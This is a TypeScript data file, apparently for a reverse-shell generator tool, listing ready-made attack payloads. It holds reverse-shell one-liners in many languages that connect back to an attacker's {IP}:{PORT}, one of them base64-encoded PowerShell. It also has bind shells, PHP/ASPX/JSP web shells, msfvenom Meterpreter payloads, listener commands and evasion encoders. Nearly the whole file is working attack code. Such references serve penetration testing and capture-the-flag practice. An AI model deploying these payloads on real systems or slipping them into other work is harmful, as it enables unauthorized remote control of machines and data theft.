export type ShellType = "reverse" | "bind" | "meterpreter" | "web"
export type Platform = "linux" | "windows" | "cross-platform"

export interface PayloadEntry {
  id: string
  shellType: ShellType
  language: string
  platform: Platform
  template: string
  description: string
  usageNote?: string
}

export interface MsfVenomPayload {
  id: string
  name: string
  payload: string
  arch: string
  format: string
  platform: Platform
  description: string
}

export interface ListenerCommand {
  id: string
  title: string
  command: string
  description: string
  platform: Platform
}

export const payloadTemplates: PayloadEntry[] = [
  {
    id: "rev-bash",
    shellType: "reverse",
    language: "Bash",
    platform: "linux",
    description: "Standard bash reverse shell using /dev/tcp",
    template: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
  },
  {
    id: "rev-bash-mkfifo",
    shellType: "reverse",
    language: "Bash",
    platform: "linux",
    description: "Bash reverse shell via mkfifo",
    template: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
  },
  {
    id: "rev-python",
    shellType: "reverse",
    language: "Python",
    platform: "linux",
    description: "Python reverse shell with subprocess",
    template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
  },
  {
    id: "rev-python-short",
    shellType: "reverse",
    language: "Python",
    platform: "linux",
    description: "Compact Python reverse shell",
    template: "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{IP}\",{PORT}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
  },
  {
    id: "rev-python-windows",
    shellType: "reverse",
    language: "Python",
    platform: "windows",
    description: "Python reverse shell for Windows",
    template: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\",\"/c\",\"powershell\"]);'",
  },
  {
    id: "rev-powershell",
    shellType: "reverse",
    language: "PowerShell",
    platform: "windows",
    description: "Full PowerShell reverse shell",
    template: "powershell -nop -w hidden -c \"$client=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'",
  },
  {
    id: "rev-ps-one-liner",
    shellType: "reverse",
    language: "PowerShell",
    platform: "windows",
    description: "Base64 PowerShell reverse shell",
    template: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAXwBJAFAAJwAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=",
  },
  {
    id: "rev-nc-traditional",
    shellType: "reverse",
    language: "Netcat",
    platform: "cross-platform",
    description: "Traditional Netcat with -e flag",
    template: "nc -e /bin/sh {IP} {PORT}",
  },
  {
    id: "rev-nc-openbsd",
    shellType: "reverse",
    language: "Netcat",
    platform: "cross-platform",
    description: "OpenBSD Netcat — pipes after connect",
    template: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
  },
  {
    id: "rev-nc-windows",
    shellType: "reverse",
    language: "Netcat",
    platform: "windows",
    description: "Windows Netcat reverse shell",
    template: "nc.exe -e cmd.exe {IP} {PORT}",
  },
  {
    id: "rev-php",
    shellType: "reverse",
    language: "PHP",
    platform: "linux",
    description: "PHP reverse shell using socket functions",
    template: "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
  },
  {
    id: "rev-php-exec",
    shellType: "reverse",
    language: "PHP",
    platform: "linux",
    description: "PHP reverse shell using fsockopen",
    template: "php -r '$s=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
  },
  {
    id: "rev-perl",
    shellType: "reverse",
    language: "Perl",
    platform: "cross-platform",
    description: "Perl reverse shell with socket",
    template: "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
  },
  {
    id: "rev-perl-telnet",
    shellType: "reverse",
    language: "Perl",
    platform: "cross-platform",
    description: "Perl reverse shell using IO::Socket",
    template: "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
  },
  {
    id: "rev-ruby",
    shellType: "reverse",
    language: "Ruby",
    platform: "linux",
    description: "Ruby reverse shell with socket",
    template: "ruby -rsocket -e 'c=TCPSocket.new(\"{IP}\",{PORT});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
  },
  {
    id: "rev-socat",
    shellType: "reverse",
    language: "Socat",
    platform: "linux",
    description: "Socat reverse shell with PTY allocation",
    template: "socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
  },
  {
    id: "rev-node",
    shellType: "reverse",
    language: "Node.js",
    platform: "cross-platform",
    description: "Node.js reverse shell",
    template: "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\")'",
  },
  {
    id: "rev-openssl",
    shellType: "reverse",
    language: "OpenSSL",
    platform: "cross-platform",
    description: "Encrypted reverse shell via OpenSSL",
    template: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s",
  },
  {
    id: "bind-nc",
    shellType: "bind",
    language: "Netcat",
    platform: "cross-platform",
    description: "Netcat bind shell (traditional)",
    template: "nc -lvp {PORT} -e /bin/sh",
  },
  {
    id: "bind-nc-openbsd",
    shellType: "bind",
    language: "Netcat",
    platform: "cross-platform",
    description: "OpenBSD Netcat bind shell",
    template: "nc -lvp {PORT} -c /bin/sh",
  },
  {
    id: "bind-python",
    shellType: "bind",
    language: "Python",
    platform: "linux",
    description: "Python bind shell",
    template: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);s.close()'",
  },
  {
    id: "bind-ncat",
    shellType: "bind",
    language: "Netcat",
    platform: "cross-platform",
    description: "Ncat bind shell (Nmap suite)",
    template: "ncat -lvp {PORT} -e /bin/bash",
    usageNote: "Bash's /dev/tcp only supports outbound connections (reverse shells), not inbound (bind). Use ncat, socat, or python for bind shells on Linux.",
  },
  {
    id: "bind-powershell",
    shellType: "bind",
    language: "PowerShell",
    platform: "windows",
    description: "PowerShell bind shell",
    template: "powershell -c \"$listener=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()'",
  },
  {
    id: "bind-socat",
    shellType: "bind",
    language: "Socat",
    platform: "linux",
    description: "Socat bind shell with PTY",
    template: "socat tcp-l:{PORT},reuseaddr,fork exec:'/bin/bash',pty,stderr",
  },
  {
    id: "bind-php",
    shellType: "bind",
    language: "PHP",
    platform: "cross-platform",
    description: "PHP bind shell",
    template: "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{PORT});socket_listen($s,1);$c=socket_accept($s);while(true){$cmd=socket_read($c,1024);socket_write($c,shell_exec($cmd));}socket_close($c);socket_close($s);'",
  },
  {
    id: "bind-perl",
    shellType: "bind",
    language: "Perl",
    platform: "cross-platform",
    description: "Perl bind shell",
    template: "perl -e 'use Socket;$p={PORT};$proto=getprotobyname(\"tcp\");socket(S,PF_INET,SOCK_STREAM,$proto);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");close(C);close(S);'",
  },
  {
    id: "web-php-simple",
    shellType: "web",
    language: "PHP",
    platform: "cross-platform",
    description: "Minimal PHP web shell",
    template: "<?php system($_GET['cmd']); ?>",
  },
  {
    id: "web-php-auth",
    shellType: "web",
    language: "PHP",
    platform: "cross-platform",
    description: "PHP web shell with password protection",
    template: "<?php \$auth_pass = '{PASSWORD}';\nif (isset(\$_GET['pass']) && \$_GET['pass'] === \$auth_pass) {\n  system(\$_GET['cmd']);\n} else {\n  echo 'Access denied';\n}\n?>",
  },
  {
    id: "web-aspx",
    shellType: "web",
    language: "ASP.NET",
    platform: "windows",
    description: "ASPX web shell (C#)",
    template: "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nvoid Page_Load(object sender, EventArgs e) {\n  string cmd = Request[\"cmd\"];\n  if (cmd != null) {\n    Process p = new Process();\n    p.StartInfo.FileName = \"cmd.exe\";\n    p.StartInfo.Arguments = \"/c \" + cmd;\n    p.StartInfo.UseShellExecute = false;\n    p.StartInfo.RedirectStandardOutput = true;\n    p.Start();\n    Response.Write(p.StandardOutput.ReadToEnd());\n  }\n}\n</script>",
  },
  {
    id: "web-jsp",
    shellType: "web",
    language: "JSP",
    platform: "cross-platform",
    description: "JSP web shell",
    template: "<%@page import=\"java.io.*\" %>\n<%\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null) {\n  Process p = Runtime.getRuntime().exec(cmd);\n  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n  String line;\n  while ((line = br.readLine()) != null) {\n    out.println(line + \"<br>\");\n  }\n}\n%>",
  },
]

export const msfVenomPayloads: MsfVenomPayload[] = [
  { id: "msf-linux-x64-rev-tcp", name: "Linux x64 Rev TCP", payload: "linux/x64/meterpreter/reverse_tcp", arch: "x64", format: "elf", platform: "linux", description: "Meterpreter for 64-bit Linux" },
  { id: "msf-linux-x86-rev-tcp", name: "Linux x86 Rev TCP", payload: "linux/x86/meterpreter/reverse_tcp", arch: "x86", format: "elf", platform: "linux", description: "Meterpreter for 32-bit Linux" },
  { id: "msf-linux-x64-rev-https", name: "Linux x64 Rev HTTPS", payload: "linux/x64/meterpreter/reverse_https", arch: "x64", format: "elf", platform: "linux", description: "Encrypted Meterpreter over HTTPS" },
  { id: "msf-win-x64-rev-tcp", name: "Windows x64 Rev TCP", payload: "windows/x64/meterpreter/reverse_tcp", arch: "x64", format: "exe", platform: "windows", description: "Meterpreter for 64-bit Windows" },
  { id: "msf-win-x86-rev-tcp", name: "Windows x86 Rev TCP", payload: "windows/meterpreter/reverse_tcp", arch: "x86", format: "exe", platform: "windows", description: "Meterpreter for 32-bit Windows" },
  { id: "msf-win-x64-rev-https", name: "Windows x64 Rev HTTPS", payload: "windows/x64/meterpreter/reverse_https", arch: "x64", format: "exe", platform: "windows", description: "Encrypted Meterpreter over HTTPS" },
  { id: "msf-linux-x64-shell-rev", name: "Linux x64 Shell Rev TCP", payload: "linux/x64/shell/reverse_tcp", arch: "x64", format: "elf", platform: "linux", description: "Stageless shell for 64-bit Linux" },
  { id: "msf-php-rev-tcp", name: "PHP Rev TCP", payload: "php/meterpreter_reverse_tcp", arch: "n/a", format: "php", platform: "cross-platform", description: "Meterpreter for PHP servers" },
  { id: "msf-python-rev-tcp", name: "Python Rev TCP", payload: "python/meterpreter/reverse_tcp", arch: "n/a", format: "py", platform: "cross-platform", description: "Meterpreter for Python" },
  { id: "msf-asp-rev-tcp", name: "ASP Rev TCP", payload: "windows/meterpreter/reverse_tcp", arch: "x86", format: "asp", platform: "windows", description: "ASP payload for IIS" },
  { id: "msf-war-rev-tcp", name: "Java WAR Rev TCP", payload: "java/meterpreter/reverse_tcp", arch: "n/a", format: "war", platform: "cross-platform", description: "Java WAR for Tomcat/JBoss" },
  { id: "msf-mac-x64-rev-tcp", name: "macOS x64 Rev TCP", payload: "osx/x64/meterpreter/reverse_tcp", arch: "x64", format: "macho", platform: "linux", description: "Meterpreter for macOS" },
  { id: "msf-android-rev-tcp", name: "Android Rev TCP", payload: "android/meterpreter/reverse_tcp", arch: "dalvik", format: "apk", platform: "linux", description: "Android Meterpreter APK" },
]

export const listenerCommands: ListenerCommand[] = [
  { id: "listener-nc", title: "Netcat", command: "nc -lvnp {PORT}", description: "Basic TCP listener", platform: "cross-platform" },
  { id: "listener-nc-ssl", title: "Netcat SSL", command: "ncat -lvnp {PORT} --ssl", description: "Encrypted listener with SSL", platform: "cross-platform" },
  { id: "listener-msf-handler", title: "MSF Multi/Handler", command: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {PAYLOAD}; set LHOST {IP}; set LPORT {PORT}; exploit'", description: "Metasploit handler", platform: "cross-platform" },
  { id: "listener-socat", title: "Socat", command: "socat tcp-l:{PORT},reuseaddr,fork -", description: "Socat listener", platform: "linux" },
  { id: "listener-pwncat", title: "Pwncat", command: "pwncat-cs -lp {PORT}", description: "Pwncat with privesc support", platform: "cross-platform" },
  { id: "listener-python-http", title: "Python HTTP", command: "python3 -m http.server {PORT}", description: "HTTP file server", platform: "cross-platform" },
  { id: "connect-nc", title: "Netcat", command: "nc {IP} {PORT}", description: "Connect to the bind shell on the target", platform: "cross-platform" },
  { id: "connect-ncat-ssl", title: "Netcat SSL", command: "ncat --ssl {IP} {PORT}", description: "Connect with SSL encryption", platform: "cross-platform" },
  { id: "connect-socat", title: "Socat", command: "socat - tcp:{IP}:{PORT}", description: "Socat connection to bind shell", platform: "linux" },
  { id: "connect-pwncat", title: "Pwncat", command: "pwncat-cs {IP}:{PORT}", description: "Pwncat connection with privesc", platform: "cross-platform" },
  { id: "access-curl", title: "cURL", command: "curl http://{IP}:{PORT}/shell.php?cmd=id", description: "HTTP request to web shell with command parameter", platform: "cross-platform" },
  { id: "access-browser", title: "Browser URL", command: "http://{IP}:{PORT}/shell.php?cmd=id", description: "Access web shell via browser URL bar", platform: "cross-platform" },
]

export const encoderOptions = [
  { name: "x64/xor", description: "XOR encoder for 64-bit", validArches: ["x64"] },
  { name: "x86/shikata_ga_nai", description: "Polymorphic XOR-additive feedback", validArches: ["x86"] },
  { name: "x86/call4_dword_xor", description: "Call-based XOR encoder", validArches: ["x86"] },
  { name: "x86/countdown", description: "Countdown timer encoder", validArches: ["x86"] },
  { name: "x86/fnstenv_mov", description: "FSTENV-based encoder", validArches: ["x86"] },
  { name: "x86/jump_call_additive", description: "Jump/Call additive feedback", validArches: ["x86"] },
  { name: "x86/nonalpha", description: "Non-alphanumeric encoder", validArches: ["x86"] },
  { name: "x86/nonupper", description: "Non-uppercase encoder", validArches: ["x86"] },
  { name: "x86/unicode_upper", description: "Unicode uppercase-safe", validArches: ["x86"] },
  { name: "x86/alpha_mixed", description: "Alphanumeric mixed-case", validArches: ["x86"] },
  { name: "x86/alpha_upper", description: "Alphanumeric uppercase", validArches: ["x86"] },
  { name: "x64/xor_dynamic", description: "Dynamic XOR key for 64-bit", validArches: ["x64"] },
  { name: "generic/none", description: "No encoding", validArches: ["x86", "x64"] },
]

export const shellTypeMeta: Record<ShellType, { label: string; description: string }> = {
  reverse: { label: "Reverse Shell", description: "Target connects back to your listener" },
  bind: { label: "Bind Shell", description: "Target opens a port — you connect to it" },
  meterpreter: { label: "Meterpreter", description: "Metasploit's advanced payload" },
  web: { label: "Web Shell", description: "Script-based shell via HTTP" },
}

export const allLanguages = [...new Set(payloadTemplates.map(p => p.language))].sort()
